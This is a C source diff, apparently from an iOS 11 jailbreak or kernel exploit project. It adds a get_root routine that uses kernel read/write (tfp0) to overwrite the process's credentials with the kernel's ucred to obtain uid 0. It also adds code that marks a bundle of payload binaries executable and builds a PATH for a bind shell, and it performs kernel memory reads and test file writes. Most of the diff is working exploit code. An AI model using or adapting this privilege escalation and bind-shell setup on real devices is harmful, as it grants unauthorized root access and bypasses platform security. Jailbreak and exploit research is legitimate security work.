@@ -6,6 +6,8 @@
 #include <mach/mach.h>
 #include <netinet/in.h>
 #include <spawn.h>
+#include <dirent.h>
+#include <sys/stat.h>
 
 #include <pthread.h>
 
@@ -701,9 +703,82 @@ char* bundle_path() {
     return path;
 }
 
+char* prepare_directory(char* dir_path) {
+    DIR *dp;
+    struct dirent *ep;
+    
+    char* in_path = NULL;
+    char* bundle_root = bundle_path();
+    asprintf(&in_path, "%s/iosbinpack64/%s", bundle_root, dir_path);
+    
+    
+    dp = opendir(in_path);
+    if (dp == NULL) {
+        printf("unable to open payload directory: %s\n", in_path);
+        return NULL;
+    }
+    
+    while ((ep = readdir(dp))) {
+        char* entry = ep->d_name;
+        char* full_entry_path = NULL;
+        asprintf(&full_entry_path, "%s/iosbinpack64/%s/%s", bundle_root, dir_path, entry);
+        
+        printf("preparing: %s\n", full_entry_path);
+        
+        // make that executable:
+        int chmod_err = chmod(full_entry_path, 0777);
+        if (chmod_err != 0){
+            perror("chmod failed");
+        }
+        
+        free(full_entry_path);
+    }
+    
+    closedir(dp);
+    free(bundle_root);
+    
+    return in_path;
+}
+
+// prepare all the payload binaries under the iosbinpack64 directory
+// and build up the PATH
+char* prepare_payload() {
+    char* path = calloc(4096, 1);
+    strcpy(path, "PATH=");
+    char* dir;
+    dir = prepare_directory("bin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("sbin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("usr/bin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("usr/local/bin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    dir = prepare_directory("usr/sbin");
+    strcat(path, dir);
+    strcat(path, ":");
+    free(dir);
+    
+    strcat(path, "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec");
+    
+    return path;
+}
+
 void bind_shell() {
     
-    char* env = "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec";
+    char* env = prepare_payload();
     char* bundle_root = bundle_path();
     
     char* shell_path = NULL;
@@ -756,11 +831,98 @@ void bind_shell() {
     free(shell_path);
 }
 
+// gets uid 0 (iOS 11)
+// add patchfinder and you should be good
+// Abraham Masri @cheesecakeufo
+// https://gist.github.com/iabem97/d11e61afa7a0d0a9f2b5a1e42ee505d8
+
+
+/*
+ * Purpose: iterates over the procs and finds our proc
+ */
+uint64_t get_our_proc() {
+    
+    uint64_t task_self = task_self_addr();
+    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    
+    
+    while (struct_task != 0) {
+        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        
+        // get the process pid
+        uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+        
+        if(pid == getpid()) {
+            return bsd_info;
+        }
+        
+        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+    }
+    return -1; // we failed :/
+}
+
+kern_return_t get_root () {
+    
+    kern_return_t ret = KERN_SUCCESS;
+    
+    uint64_t our_proc = get_our_proc();
+    
+    if(our_proc == -1) {
+        printf("[ERROR]: no our proc. wut\n");
+        ret = KERN_FAILURE;
+        return ret;
+    }
+    
+    extern uint64_t kernel_task;
+    printf("[INFO]: kernel_task: %llx\n", kernel_task); // BSD_INFO
+    
+    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    printf("[INFO]: kern_ucred: %llx\n", kern_ucred);
+    
+    uint64_t offsetof_p_csflags = 0x2a8;
+    
+    uint32_t csflags = kread_uint32(our_proc + offsetof_p_csflags);
+    
+    uint64_t our_cred = kread_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    
+    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
+    
+    
+    printf("[INFO]: successfully wrote our kern_ucred into our cred!\n");
+    
+    setuid(0);
+    printf("[INFO]: getuid: %d\n", getuid());
+    int fd = open("/var/mobile/xxx", O_WRONLY);
+    
+    // you'll probably panic few seconds after this thanks to the new sandbox protections
+    
+    return ret;
+}
 
 mach_port_t go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
-  //bind_shell();
+    
+    
+    uint64_t kernelbase = find_kernel_base();
+    
+    extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
+    uint64_t magic = 0;
+    mach_vm_size_t sz = sizeof(magic);
+    kern_return_t ret = mach_vm_read_overwrite(tfp0, kernelbase, sizeof(magic), (mach_vm_address_t)&magic, &sz);
+    printf("mach_vm_read_overwrite: %x, %s\n", magic, mach_error_string(ret));
+    
+    FILE *f = fopen("/var/mobile/test.txt", "w");
+    if(f == 0){
+        printf("failed to write file\n");
+    }
+    
+    //char* env_path = prepare_payload();
+    //printf("will launch a shell with this environment: %s\n", env_path);
+    
+    //bind_shell(env_path, 493);
+    //free(env_path);
+    
   if (probably_have_correct_symbols()) {
     printf("have symbols for this device, testing the kernel debugger...\n");
     test_kdbg();
